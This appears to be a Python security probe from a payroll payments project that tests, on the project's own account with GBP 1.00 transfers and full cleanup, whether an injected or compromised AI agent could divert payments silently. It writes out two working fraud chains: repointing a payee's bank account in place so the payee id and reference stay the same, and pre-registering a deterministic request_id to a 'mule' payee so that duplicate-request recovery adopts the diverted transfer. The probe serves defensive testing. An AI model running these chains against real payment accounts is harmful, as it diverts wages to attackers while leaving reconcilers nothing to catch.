"""The DEFCON question: can an injected/compromised agent send money to the wrong account for DAYS with
no signal a human or a reconciliation agent could catch? Two composed chains, live on Kestrel's OWN
account, GBP 1.00, PRB- payees, everything cancelled + deleted in finally.

  CHAIN 1  silent repoint: create a payee, record the FULL object, repoint the bank account in place,
           GET it again and DIFF. The crux of "no one notices" is: does ANYTHING change that a daily
           reconciler could key on (updated_at / version / audit field), or only the bank account itself?
           Then pay to it and confirm the money follows the new account while the id + reference are
           byte-for-byte what last month's payroll used.

  CHAIN 2  idempotency substitution: request_id dedupe is per-account and ignores payload (gap 9). An
           injected agent that fires the deterministic request_id FIRST, to a mule, pre-registers it.
           The legitimate executor then calls the SAME request_id to the real payee -> duplicate_request_id,
           and the sanctioned recovery ("GET the original, treat it as the result") ADOPTS the mule
           transfer. The anti-double-pay safety becomes the delivery mechanism.

  export MSYS_NO_PATHCONV=1 PYTHONIOENCODING=utf-8; uv run python bench/probes/silent_divert.py
"""
from __future__ import annotations

import json
import os
import sys
import time
from decimal import Decimal
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path[:0] = [str(ROOT), str(ROOT / "scripts")]
import awx as _env  # noqa: E402

for n in ("AWX_CLIENT_ID", "AWX_API_KEY", "AWX_BASE_URL", "AWX_EMPLOYER_A", "AWX_EMPLOYER_B", "AWX_EMPLOYER_C", "AWX_PLATFORM_ACCOUNT"):
    os.environ.setdefault(n, _env.env(n) or "")
from ringfence.awx import Awx, AwxError  # noqa: E402

TAG = f"PRB-divert-{int(time.time()) % 100000}"
ks = Awx().for_tenant("kestrel")
made_t: list[str] = []
made_b: list[str] = []
AUDIT_FIELDS = ("created_at", "updated_at", "last_modified", "modified_at", "version", "revision")


def say(*a):
    print(*a, flush=True)


def call(f, *a):
    try:
        return f(*a)
    except AwxError as e:
        return {"_error": e.status, "code": e.code, "msg": str(e)[:200], "details": e.details}


def ben(who, acct, sort="040004", bank="HSBC"):
    p = {"nickname": f"{TAG}-{who}", "transfer_methods": ["LOCAL"], "beneficiary": {
        "entity_type": "PERSONAL", "first_name": who, "last_name": "Probe",
        "address": {"country_code": "GB", "city": "London", "street_address": "1 Test St", "postcode": "EC1A 1BB"},
        "bank_details": {"bank_country_code": "GB", "account_currency": "GBP", "account_name": f"{who} Probe", "bank_name": bank,
                         "account_routing_type1": "sort_code", "account_routing_value1": sort, "account_number": acct}}}
    bid = ks.post("/beneficiaries/create", p)["id"]
    made_b.append(bid)
    return bid, p


def repoint(bid, p, acct="99999901", sort="200000", bank="Barclays"):
    b = json.loads(json.dumps(p["beneficiary"]))
    b["bank_details"].update(account_number=acct, account_routing_value1=sort, bank_name=bank)
    return call(ks.post, f"/beneficiaries/{bid}/update", {"transfer_methods": ["LOCAL"], "beneficiary": b})


def acct_of(obj):
    """account_number + sort out of a beneficiary GET or a transfer object."""
    b = obj.get("beneficiary", obj) if isinstance(obj, dict) else {}
    bd = (b.get("bank_details") or {})
    return f"..{str(bd.get('account_number','?'))[-4:]} sort {bd.get('account_routing_value1')}"


def body(bid, rid):
    return {"request_id": rid, "beneficiary_id": bid, "transfer_amount": Decimal("1.00"), "transfer_currency": "GBP",
            "source_currency": "GBP", "transfer_method": "LOCAL", "reason": "professional_business_services",
            "reference": "Payroll Oct - J. Doe"}


def diff_keys(a, b, path=""):
    """keys whose value changed between two beneficiary GETs (flattened)."""
    out = []
    ka = a if isinstance(a, dict) else {}
    kb = b if isinstance(b, dict) else {}
    for k in sorted(set(ka) | set(kb)):
        pa, pb = ka.get(k), kb.get(k)
        p = f"{path}.{k}" if path else k
        if isinstance(pa, dict) or isinstance(pb, dict):
            out += diff_keys(pa or {}, pb or {}, p)
        elif pa != pb:
            out.append((p, pa, pb))
    return out


def chain1_silent_repoint():
    say("\n== CHAIN 1: silent repoint (what can a reconciler detect?)")
    bid, p = ben("Legit", "11112222")
    before = ks.get(f"/beneficiaries/{bid}")
    say("payee id", bid, "account", acct_of(before))
    present_audit = [f for f in AUDIT_FIELDS if _find(before, f)]
    say("audit/version fields present on payee object:", present_audit or "NONE")

    r = repoint(bid, p)
    say("repoint in place:", "ok" if "_error" not in r else r)
    after = ks.get(f"/beneficiaries/{bid}")
    say("account now", acct_of(after), "| id unchanged:", bid)
    changed = diff_keys(before, after)
    say("fields that CHANGED on the payee after repoint:")
    for pth, pa, pb in changed:
        say(f"    {pth}: {pa!r} -> {pb!r}")
    non_bank_changes = [c for c in changed if "bank_details" not in c[0] and "nickname" not in c[0]]
    say("VERDICT C1:", "only the bank account changed - NO signal a reconciler could key on"
        if not non_bank_changes else f"a detectable field also changed: {[c[0] for c in non_bank_changes]}")

    # pay to the repointed payee: same id, same reference as 'last month', money follows the new account
    t = call(ks.post_money, "/transfers/create", body(bid, f"{TAG}-c1pay"))
    if "id" in t:
        made_t.append(t["id"])
        say(f"paid: transfer {t['id']} reference={t.get('reference')!r} payee_id={bid} -> money to {acct_of(t)}")
        say("VERDICT C1b: approver/ledger see id+reference of last month's payee; money went to", acct_of(t))
    else:
        say("pay failed:", t)
    return not non_bank_changes


def chain2_idempotency_substitution():
    say("\n== CHAIN 2: idempotency substitution (attacker pre-registers the request_id)")
    legit, _ = ben("Payee", "11112222")
    mule, _ = ben("Mule", "99999901", sort="200000", bank="Barclays")
    rid = f"{TAG}-run42"  # the executor's deterministic id for this payroll line

    atk = call(ks.post_money, "/transfers/create", body(mule, rid))
    if "id" not in atk:
        return say("attacker pre-register failed (chain n/a):", atk)
    made_t.append(atk["id"])
    say(f"attacker fired FIRST  request_id={rid} -> transfer {atk['id']} to MULE {acct_of(atk)}")

    leg = call(ks.post_money, "/transfers/create", body(legit, rid))  # same id, real payee
    say("legit executor fires SAME request_id to real payee ->",
        json.dumps({k: leg.get(k) for k in ("_error", "code", "id", "status")}, default=str))
    orig_id = None
    for d in (leg.get("details") or []):
        if isinstance(d, dict) and d.get("id"):
            orig_id = d["id"]
    orig_id = orig_id or (leg.get("details") or {}).get("id") if isinstance(leg.get("details"), dict) else orig_id
    say("duplicate_request_id points recovery at original id:", orig_id)

    if orig_id:
        adopted = ks.get(f"/transfers/{orig_id}")
        say(f"recovery GET {orig_id} -> payee_id={adopted.get('beneficiary_id')} money to {acct_of(adopted)}")
        hit = adopted.get("beneficiary_id") == mule
        say("VERDICT C2:", "SUBSTITUTED - executor adopts the MULE transfer as the 'paid' payroll line"
            if hit else "not substituted (recovery resolved to the real payee)")
        return hit
    say("VERDICT C2: inconclusive - no original id returned on duplicate")
    return False


def _find(obj, key):
    if isinstance(obj, dict):
        if key in obj:
            return True
        return any(_find(v, key) for v in obj.values())
    return False


def cleanup():
    say("\n== cleanup")
    for tid in made_t:
        st = "?"
        for i in range(5):
            call(ks.post, f"/transfers/{tid}/cancel", {})
            st = ks.get(f"/transfers/{tid}").get("status")
            if st in ("CANCELLED", "FAILED"):
                break
            time.sleep(3 * (i + 1))
        else:
            call(ks.post, f"/simulation/transfers/{tid}/transition", {"status": "FAILED"})
            st = ks.get(f"/transfers/{tid}").get("status")
        say("transfer", tid, st)
    for bid in made_b:
        call(ks.post, f"/beneficiaries/{bid}/delete", {})
        say("payee deleted", bid)
    # sweep any PRB-divert payee left behind
    for b in ks.get("/beneficiaries", {"page_num": 0, "page_size": 100}).get("items", []):
        if str(b.get("nickname", "")).startswith(TAG):
            call(ks.post, f"/beneficiaries/{b['id']}/delete", {})
            say("swept payee", b["id"])


if __name__ == "__main__":
    c1 = c2 = None
    try:
        c1 = chain1_silent_repoint()
        c2 = chain2_idempotency_substitution()
    except Exception as e:  # noqa: BLE001
        say(f"harness error {type(e).__name__}: {e}")
    finally:
        cleanup()
    say(f"\nSUMMARY silent_repoint_undetectable={c1} idempotency_substitution={c2}")
    # self-check: repoint must succeed (c1 not None) or the probe proved nothing.
    assert c1 is not None, "chain 1 did not run to a verdict"
    say("self-check ok")
